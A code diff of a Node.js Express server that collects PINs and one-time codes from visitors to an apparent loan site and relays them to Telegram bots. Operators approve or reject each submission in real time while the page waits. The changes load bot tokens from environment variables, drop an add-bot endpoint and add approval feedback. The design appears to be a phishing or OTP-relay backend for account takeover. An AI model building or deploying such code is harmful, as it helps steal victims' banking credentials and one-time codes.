@@ -3,11 +3,9 @@ const express = require('express');
 const axios = require('axios');
 const { v4: uuidv4 } = require('uuid');
 const path = require('path');
-const fs = require('fs');
 
 const app = express();
 const PORT = process.env.PORT || 10000;
-const BOTS_FILE = path.join(__dirname, 'bots.json');
 
 // ---------------- BACKEND DOMAIN (HARD-LOCKED) ----------------
 const BACKEND_DOMAIN = 'https://credit-mola-loans.onrender.com';
@@ -17,24 +15,24 @@ const approvedPins = {};
 const approvedCodes = {};
 const requestBotMap = {};
 
-// ---------------- MULTI-BOT STORE ----------------
-let bots = [];
-if (fs.existsSync(BOTS_FILE)) {
-    try {
-        bots = JSON.parse(fs.readFileSync(BOTS_FILE, 'utf-8'));
-        console.log('✅ Bots loaded from bots.json:', bots.map(b => b.botId));
-    } catch {
-        bots = [];
+// ---------------- MULTI-BOT STORE (FROM .ENV) ----------------
+const bots = [];
+
+// Auto-detect all BOTx_TOKEN + BOTx_CHATID in .env
+Object.keys(process.env).forEach(key => {
+    const tokenMatch = key.match(/^BOT(\d+)_TOKEN$/);
+    if (tokenMatch) {
+        const id = `bot${tokenMatch[1]}`;
+        const token = process.env[key];
+        const chatIdKey = `BOT${tokenMatch[1]}_CHATID`;
+        const chatId = process.env[chatIdKey];
+        if (token && chatId) {
+            bots.push({ botId: id, botToken: token, chatId });
+        }
     }
-} else {
-    bots = [
-        { botId: 'bot1', botToken: process.env.BOT1_TOKEN, chatId: process.env.BOT1_CHATID },
-        { botId: 'bot2', botToken: process.env.BOT2_TOKEN, chatId: process.env.BOT2_CHATID },
-        { botId: 'bot3', botToken: process.env.BOT3_TOKEN, chatId: process.env.BOT3_CHATID },
-        { botId: 'bot4', botToken: process.env.BOT4_TOKEN, chatId: process.env.BOT4_CHATID }
-    ];
-    fs.writeFileSync(BOTS_FILE, JSON.stringify(bots, null, 2));
-}
+});
+
+console.log('✅ Bots loaded from .env:', bots.map(b => b.botId));
 
 // ---------------- MIDDLEWARE ----------------
 app.use(express.json());
@@ -44,9 +42,6 @@ app.use(express.static('public'));
 // ---------------- HELPERS ----------------
 function getBot(botId) {
     return bots.find(b => b.botId === botId);
-}
-function saveBots() {
-    fs.writeFileSync(BOTS_FILE, JSON.stringify(bots, null, 2));
 }
 
 // ---------------- TELEGRAM HELPERS ----------------
@@ -60,6 +55,7 @@ async function sendTelegramMessage(bot, text, inlineKeyboard = []) {
         console.error(err.response?.data || err.message);
     }
 }
+
 async function answerCallback(bot, callbackId) {
     try {
         await axios.post(
@@ -84,6 +80,7 @@ async function setWebhookForBot(bot) {
         console.error(`❌ Failed to set webhook for ${bot.botId}:`, err.response?.data || err.message);
     }
 }
+
 async function setWebhooksForAllBots() {
     for (const bot of bots) {
         await setWebhookForBot(bot);
@@ -118,6 +115,7 @@ app.post('/submit-pin', (req, res) => {
 
     res.json({ requestId });
 });
+
 app.get('/check-pin/:requestId', (req, res) => {
     res.json({ approved: approvedPins[req.params.requestId] ?? null });
 });
@@ -139,6 +137,7 @@ app.post('/submit-code', (req, res) => {
 
     res.json({ requestId });
 });
+
 app.get('/check-code/:requestId', (req, res) => {
     res.json({ approved: approvedCodes[req.params.requestId] ?? null });
 });
@@ -152,32 +151,30 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
     if (!cb) return res.sendStatus(200);
 
     const [action, requestId] = cb.data.split(':');
-    if (action === 'pin_ok') approvedPins[requestId] = true;
-    if (action === 'pin_bad') approvedPins[requestId] = false;
-    if (action === 'code_ok') approvedCodes[requestId] = true;
-    if (action === 'code_bad') approvedCodes[requestId] = false;
+
+    let feedback = '';
+    if (action === 'pin_ok') {
+        approvedPins[requestId] = true;
+        feedback = `✅ PIN Approved for requestId: ${requestId}`;
+    }
+    if (action === 'pin_bad') {
+        approvedPins[requestId] = false;
+        feedback = `❌ PIN Rejected for requestId: ${requestId}`;
+    }
+    if (action === 'code_ok') {
+        approvedCodes[requestId] = true;
+        feedback = `✅ CODE Approved for requestId: ${requestId}`;
+    }
+    if (action === 'code_bad') {
+        approvedCodes[requestId] = false;
+        feedback = `❌ CODE Rejected for requestId: ${requestId}`;
+    }
+
+    // Send feedback to the same bot chat
+    if (feedback) await sendTelegramMessage(bot, feedback);
 
     await answerCallback(bot, cb.id);
     res.sendStatus(200);
-});
-
-// ---------------- ADD BOT ----------------
-app.post('/add-bot', async (req, res) => {
-    const { botId, botToken, chatId } = req.body;
-    if (!botId || !botToken || !chatId) return res.status(400).json({ error: 'botId, botToken, chatId required' });
-    if (getBot(botId)) return res.status(400).json({ error: 'Bot already exists' });
-
-    bots.push({ botId, botToken, chatId });
-    saveBots();
-
-    const webhookUrl = `${BACKEND_DOMAIN}/telegram-webhook/${botId}`;
-    try {
-        await axios.get(`https://api.telegram.org/bot${botToken}/setWebhook?url=${webhookUrl}`);
-    } catch {
-        return res.status(500).json({ error: 'Failed to set webhook' });
-    }
-
-    res.json({ ok: true, botLink: `${BACKEND_DOMAIN}/bot/${botId}` });
 });
 
 // ---------------- DEBUG ----------------
